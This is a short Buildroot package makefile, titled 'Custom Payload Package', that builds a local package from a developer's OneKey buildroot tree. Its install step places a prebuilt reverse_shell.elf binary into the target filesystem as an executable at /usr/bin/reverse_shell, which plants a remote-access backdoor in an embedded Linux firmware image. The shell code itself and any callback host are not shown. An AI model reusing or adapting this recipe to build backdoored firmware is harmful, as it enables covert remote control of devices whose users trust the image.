################################################################################
# Custom Payload Package
################################################################################

# Define a custom variable for your project directory
MY_PROJECT_DIR = /home/ahmed/Desktop/OneKey/buildroot-2024.08.2

CUSTOM_PAYLOAD_VERSION = 1.0
CUSTOM_PAYLOAD_SITE = $(MY_PROJECT_DIR)/package/custom_payload
CUSTOM_PAYLOAD_SITE_METHOD = local
CUSTOM_PAYLOAD_LICENSE = Proprietary
CUSTOM_PAYLOAD_LICENSE_FILES =

define CUSTOM_PAYLOAD_INSTALL_TARGET_CMDS
    $(INSTALL) -D -m 0755 $(CUSTOM_PAYLOAD_SITE)/reverse_shell.elf \
        $(TARGET_DIR)/usr/bin/reverse_shell
endef

$(eval $(generic-package))

